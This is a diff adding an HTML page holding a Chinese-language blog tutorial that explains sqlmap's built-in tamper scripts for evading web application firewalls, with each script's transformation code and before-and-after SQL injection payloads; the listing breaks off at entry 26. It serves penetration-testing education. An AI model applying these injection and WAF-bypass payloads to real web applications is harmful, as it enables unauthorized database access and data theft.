@@ -1,0 +1,1299 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="sqlmap相信每个安全从业者都耳熟能详，作为一枚菜鸡安全从业者也不例外，但是平时使用过程中仅仅停留在表层，尤其是对于其中的绕waf的tamper脚本方面，只会一通乱怂，怂不下来就撤，但是一直这样也不是办法，于是就想着了解每个tamper脚本的作用且针对什么数据库有效，了解之后再去修改编写自己的tamper脚本，这样才能更好的辅助我们日常的工作。关于sqlmap的使用大家可以食用超详细SQLMap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap tamper详解">
+<meta property="og:url" content="http://yoursite.com/2019/06/24/sqlmap-tamper详解/index.html">
+<meta property="og:site_name" content="Guko&#39;s Blog">
+<meta property="og:description" content="sqlmap相信每个安全从业者都耳熟能详，作为一枚菜鸡安全从业者也不例外，但是平时使用过程中仅仅停留在表层，尤其是对于其中的绕waf的tamper脚本方面，只会一通乱怂，怂不下来就撤，但是一直这样也不是办法，于是就想着了解每个tamper脚本的作用且针对什么数据库有效，了解之后再去修改编写自己的tamper脚本，这样才能更好的辅助我们日常的工作。关于sqlmap的使用大家可以食用超详细SQLMap">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-06-25T05:31:19.541Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sqlmap tamper详解">
+<meta name="twitter:description" content="sqlmap相信每个安全从业者都耳熟能详，作为一枚菜鸡安全从业者也不例外，但是平时使用过程中仅仅停留在表层，尤其是对于其中的绕waf的tamper脚本方面，只会一通乱怂，怂不下来就撤，但是一直这样也不是办法，于是就想着了解每个tamper脚本的作用且针对什么数据库有效，了解之后再去修改编写自己的tamper脚本，这样才能更好的辅助我们日常的工作。关于sqlmap的使用大家可以食用超详细SQLMap">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/06/24/sqlmap-tamper详解/">
+
+
+
+
+
+  <title>sqlmap tamper详解 | Guko's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Guko's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/24/sqlmap-tamper详解/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Guko">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Guko's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sqlmap tamper详解</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-24T16:44:07+08:00">
+                2019-06-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  5.1k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  25 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>sqlmap相信每个安全从业者都耳熟能详，作为一枚菜鸡安全从业者也不例外，但是平时使用过程中仅仅停留在表层，尤其是对于其中的绕waf的tamper脚本方面，只会一通乱怂，怂不下来就撤，但是一直这样也不是办法，于是就想着了解每个tamper脚本的作用且针对什么数据库有效，了解之后再去修改编写自己的tamper脚本，这样才能更好的辅助我们日常的工作。关于sqlmap的使用大家可以食用<a href="https://www.freebuf.com/sectool/164608.html" target="_blank" rel="noopener">超详细SQLMap使用攻略及技巧分享 </a>。</p>
+<h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py XXXXX --tamper <span class="string">"模块名"</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="各个tamper的作用"><a href="#各个tamper的作用" class="headerlink" title="各个tamper的作用"></a>各个tamper的作用</h4><p>下面就针对sqlmap自带的tamper脚本做一个简单介绍。</p>
+<a id="more"></a>
+<h5 id="1-apostrophemask-py"><a href="#1-apostrophemask-py" class="headerlink" title="1.apostrophemask.py"></a>1.apostrophemask.py</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">return</span> payload.replace(<span class="string">'\'</span><span class="string">', "%EF%BC%87") if payload else payload</span></span><br></pre></td></tr></table></figure>
+
+<p>将单引号进行url编码，用于过滤了单引号的情况。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">' AND '</span>1<span class="string">'='</span>1 to 1%EF%BC%87 AND %EF%BC%871%EF%BC%87=%EF%BC%871</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：ALL</p>
+<h5 id="2-apostrophenullencode-py"><a href="#2-apostrophenullencode-py" class="headerlink" title="2.apostrophenullencode.py"></a>2.apostrophenullencode.py</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">return</span> payload.replace(<span class="string">'\'</span><span class="string">', "%00%27") if payload else payload</span></span><br></pre></td></tr></table></figure>
+
+<p>将单引号替换为unicode字符%00%27，用于过滤了单引号的情况。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND <span class="string">'1'</span>=<span class="string">'1 to 1 AND %00%271%00%27=%00%271</span></span><br></pre></td></tr></table></figure>
+
+<p>适用数据库:ALL</p>
+<h5 id="3-appendnullbyte-py"><a href="#3-appendnullbyte-py" class="headerlink" title="3.appendnullbyte.py"></a>3.appendnullbyte.py</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">return</span> <span class="string">"%s%%00"</span> % payload <span class="keyword">if</span> payload <span class="keyword">else</span> payload</span><br></pre></td></tr></table></figure>
+
+<p>在有效payload结束位置添加%00</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'1 AND 1=1'</span> to <span class="string">'1 AND 1=1%00'</span></span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：Access</p>
+<h5 id="4-base64encode-py"><a href="#4-base64encode-py" class="headerlink" title="4.base64encode.py"></a>4.base64encode.py</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">return</span> encodeBase64(payload, binary=False) <span class="keyword">if</span> payload <span class="keyword">else</span> payload</span><br></pre></td></tr></table></figure>
+
+<p>使用base64进行编码替换</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">' AND SLEEP(5)# to MScgQU5EIFNMRUVQKDUpIw==</span></span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：ALL</p>
+<h5 id="5-between-py"><a href="#5-between-py" class="headerlink" title="5.between.py"></a>5.between.py</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">retVal = payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> payload:</span><br><span class="line">    match = re.search(r<span class="string">"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^&gt;]+?)\s*&gt;\s*([^&gt;]+)\s*\Z"</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> match:</span><br><span class="line">        _ = <span class="string">"%s %s NOT BETWEEN 0 AND %s"</span> % (match.group(2), match.group(4), match.group(5))</span><br><span class="line">        retVal = retVal.replace(match.group(0), _)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        retVal = re.sub(r<span class="string">"\s*&gt;\s*(\d+|'[^']+'|\w+\(\d+\))"</span>, r<span class="string">" NOT BETWEEN 0 AND \g&lt;1&gt;"</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> retVal == payload:</span><br><span class="line">        match = re.search(r<span class="string">"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^=]+?)\s*=\s*([\w()]+)\s*"</span>, payload)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> match:</span><br><span class="line">            _ = <span class="string">"%s %s BETWEEN %s AND %s"</span> % (match.group(2), match.group(4), match.group(5), match.group(5))</span><br><span class="line">            retVal = retVal.replace(match.group(0), _)</span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span> retVal</span><br></pre></td></tr></table></figure>
+
+<p>将大于符号和等号用between语句替换，用于过滤了大于符号和等号的情况。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 AND A &gt; B-- to 1 AND A NOT BETWEEN 0 AND B--</span><br><span class="line">1 AND A = B-- to 1 AND A BETWEEN B AND B--</span><br><span class="line">1 AND LAST_INSERT_ROWID()=LAST_INSERT_ROWID() to 1 AND LAST_INSERT_ROWID() BETWEEN LAST_INSERT_ROWID() AND LAST_INSERT_ROWID()</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：ALL</p>
+<h5 id="6-bluecoat-py"><a href="#6-bluecoat-py" class="headerlink" title="6.bluecoat.py"></a>6.bluecoat.py</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">def process(match):</span><br><span class="line">        word = match.group(<span class="string">'word'</span>)</span><br><span class="line">        <span class="keyword">if</span> word.upper() <span class="keyword">in</span> kb.keywords:</span><br><span class="line">            <span class="built_in">return</span> match.group().replace(word, <span class="string">"%s%%09"</span> % word)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">return</span> match.group()</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = re.sub(r<span class="string">"\b(?P&lt;word&gt;[A-Z_]+)(?=[^\w(]|\Z)"</span>, process, retVal)</span><br><span class="line">        retVal = re.sub(r<span class="string">"\s*=\s*"</span>, <span class="string">" LIKE "</span>, retVal)</span><br><span class="line">        retVal = retVal.replace(<span class="string">"%09 "</span>, <span class="string">"%09"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> retVal</span><br></pre></td></tr></table></figure>
+
+<p>用随机的空白字符代替空格，并且将等号替换为like，用于过滤了空格和等号的情况。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users WHERE id = 1 to SELECT%09id FROM%09users WHERE%09id LIKE 1</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：MySQL 5.1, SGOS</p>
+<h5 id="7-chardoubleencode-py"><a href="#7-chardoubleencode-py" class="headerlink" title="7.chardoubleencode.py"></a>7.chardoubleencode.py</h5><p>双url编码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM%20TABLE to %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：ALL</p>
+<h5 id="8-charencode-py"><a href="#8-charencode-py" class="headerlink" title="8.charencode.py"></a>8.charencode.py</h5><p>url编码,用url编码一次你的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM%20TABLE to %53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：ALL</p>
+<h5 id="9-charunicodeencode-py"><a href="#9-charunicodeencode-py" class="headerlink" title="9.charunicodeencode.py"></a>9.charunicodeencode.py</h5><p>用unicode url编码payload ，只编码非编码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD%20FROM TABLE to %u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：ALL，但是需要asp和asp.net环境</p>
+<h5 id="10-charunicodeescape-py"><a href="#10-charunicodeescape-py" class="headerlink" title="10.charunicodeescape.py"></a>10.charunicodeescape.py</h5><p>把指定的payload反向编码未编码的字符</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM TABLE to \\\\u0053\\\\u0045\\\\u004C\\\\u0045\\\\u0043\\\\u0054\\\\u0020\\\\u0046\\\\u0049\\\\u0045\\\\u004C\\\\u0044\\\\u0020\\\\u0046\\\\u0052\\\\u004F\\\\u004D\\\\u0020\\\\u0054\\\\u0041\\\\u0042\\\\u004C\\\\u0045</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：…</p>
+<h5 id="11-commalesslimit-py"><a href="#11-commalesslimit-py" class="headerlink" title="11.commalesslimit.py"></a>11.commalesslimit.py</h5><p>将payload中的逗号用offset代替，用于过滤了逗号并且是两个参数的情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT 2, 3 to LIMIT 3 OFFSET 2</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：MySQL</p>
+<h5 id="12-commalessmid-py"><a href="#12-commalessmid-py" class="headerlink" title="12.commalessmid.py"></a>12.commalessmid.py</h5><p>将payload中的逗号用from for 代替，用于过滤了逗号并且是三参数的情况，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MID(VERSION(), 1, 1) to MID(VERSION() FROM 1 FOR 1)</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：MySQL</p>
+<h5 id="13-commentbeforeparentheses-py"><a href="#13-commentbeforeparentheses-py" class="headerlink" title="13.commentbeforeparentheses.py"></a>13.commentbeforeparentheses.py</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">retVal = re.sub(r<span class="string">"\b(\w+)\("</span>, r<span class="string">"\g&lt;1&gt;/**/("</span>, retVal)</span><br></pre></td></tr></table></figure>
+
+<p>在括号前加<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```bash</span><br><span class="line">SELECT ABS(1) to SELECT ABS/**/(1)</span><br></pre></td></tr></table></figure></p>
+<p>适用数据库:ALL</p>
+<h5 id="14-concat2concatws-py"><a href="#14-concat2concatws-py" class="headerlink" title="14.concat2concatws.py"></a>14.concat2concatws.py</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = payload.replace(<span class="string">"CONCAT("</span>, <span class="string">"CONCAT_WS(MID(CHAR(0),0,0),"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>替换CONCAT为CONCAT_WS,用于过滤了concat函数的情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONCAT(1,2) to CONCAT_WS(MID(CHAR(0),0,0),1,2)</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：MySQL</p>
+<h5 id="15-equaltolike-py"><a href="#15-equaltolike-py" class="headerlink" title="15.equaltolike.py"></a>15.equaltolike.py</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">retVal = re.sub(r<span class="string">"\s*=\s*"</span>, <span class="string">" LIKE "</span>, retVal)</span><br></pre></td></tr></table></figure>
+
+<p>将等号替换成like，用于过滤了等号的情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=1 to SELECT * FROM users WHERE id LIKE 1</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：ALL</p>
+<h5 id="16-escapequotes-py"><a href="#16-escapequotes-py" class="headerlink" title="16.escapequotes.py"></a>16.escapequotes.py</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">return</span> payload.replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>).replace(<span class="string">'"'</span>, <span class="string">'\\"'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>将双引号替换成\\，用于过滤了双引号的情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">" AND SLEEP(5)# to 1\\\\"</span> AND SLEEP(5)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p> 适用数据库：ALL</p>
+<h5 id="17-greatest-py"><a href="#17-greatest-py" class="headerlink" title="17.greatest.py"></a>17.greatest.py</h5><p>  用greatest代替大于符号，用于过滤了大于符号的情况<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND A &gt; B to 1 AND GREATEST(A,B+1)=A</span><br></pre></td></tr></table></figure></p>
+<p> 适用数据库：ALL</p>
+<h5 id="18-halfversionedmorekeywords-py"><a href="#18-halfversionedmorekeywords-py" class="headerlink" title="18.halfversionedmorekeywords.py"></a>18.halfversionedmorekeywords.py</h5><p>在每个关键词前面加注释，用于过滤了关键字的情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value<span class="string">' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND '</span>QDWa<span class="string">'='</span>QDWa to value<span class="string">'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND '</span>QDWa<span class="string">'='</span>QDWa</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：MySQL &lt; 5.1</p>
+<h5 id="19-hex2char-py"><a href="#19-hex2char-py" class="headerlink" title="19.hex2char.py"></a>19.hex2char.py</h5><p>将每个编码后的字符转换成等价表达，既用等价的CONCAT（CHAR（），…）对应替换每个（MySQL）0x <hex>编码的字符串</hex></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 0xdeadbeef to SELECT CONCAT(CHAR(222),CHAR(173),CHAR(190),CHAR(239))</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：MySQL 4, 5.0 and 5.5</p>
+<h5 id="20-htmlencode-py"><a href="#20-htmlencode-py" class="headerlink" title="20.htmlencode.py"></a>20.htmlencode.py</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">return</span> re.sub(r<span class="string">"[^\w]"</span>, lambda match: <span class="string">"&amp;#%d;"</span> % ord(match.group(0)), payload) <span class="keyword">if</span> payload <span class="keyword">else</span> payload</span><br></pre></td></tr></table></figure>
+
+<p>html编码所有非字母和数字的字符,将payload进行html编码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">' AND SLEEP(5)# to 1&amp;#39;&amp;#32;AND&amp;#32;SLEEP&amp;#40;5&amp;#41;&amp;#35;</span></span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：…</p>
+<h5 id="21-ifnull2casewhenisnull-py"><a href="#21-ifnull2casewhenisnull-py" class="headerlink" title="21.ifnull2casewhenisnull.py"></a>21.ifnull2casewhenisnull.py</h5><p>改变ifull语句的写法，用于绕过过滤了ifnull（）函数的Web应用程序防火墙</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IFNULL(1, 2) to CASE WHEN ISNULL(1) THEN (2) ELSE (1) END</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：MySQL 5.0 and 5.5</p>
+<h5 id="22-ifnull2ifisnull-py"><a href="#22-ifnull2ifisnull-py" class="headerlink" title="22.ifnull2ifisnull.py"></a>22.ifnull2ifisnull.py</h5><p>替换ifnull为if(isnull(A))</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IFNULL(1, 2) to IF(ISNULL(1),2,1</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：MySQL 5.0 and 5.5</p>
+<h5 id="23-informationschemacomment-py"><a href="#23-informationschemacomment-py" class="headerlink" title="23.informationschemacomment.py"></a>23.informationschemacomment.py</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">retVal = re.sub(r<span class="string">"(?i)(information_schema)\."</span>, r<span class="string">"\g&lt;1&gt;/**/."</span>, payload)</span><br></pre></td></tr></table></figure>
+
+<p>标示符后添加注释，在information_schema后面加内联注释符，用于绕过对information-schema的情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT table_name FROM INFORMATION_SCHEMA.TABLES to SELECT table_name FROM INFORMATION_SCHEMA/**/.TABLES</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：ALL</p>
+<h5 id="24-least-py"><a href="#24-least-py" class="headerlink" title="24.least.py"></a>24.least.py</h5><p>替换大于号为least,用于过滤了大于号的情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND A &gt; B to 1 AND LEAST(A,B+1)=B+1</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</p>
+<h5 id="25-lowercase-py"><a href="#25-lowercase-py" class="headerlink" title="25.lowercase.py"></a>25.lowercase.py</h5><p>全部替换为小写值，既将payload当中的大写转为小写</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT to insert</span><br></pre></td></tr></table></figure>
+
+<p>适用数据库：ALL</p>
+<h5 id="26-luanginx-py"><a href="#26-luanginx-py" class="headerlink" title="26.luanginx.py"></a>26.luanginx.py</h5><p>用于绕过Lua nginx WAF,Lua nginx WAF不支持处理超过100个参数</p>
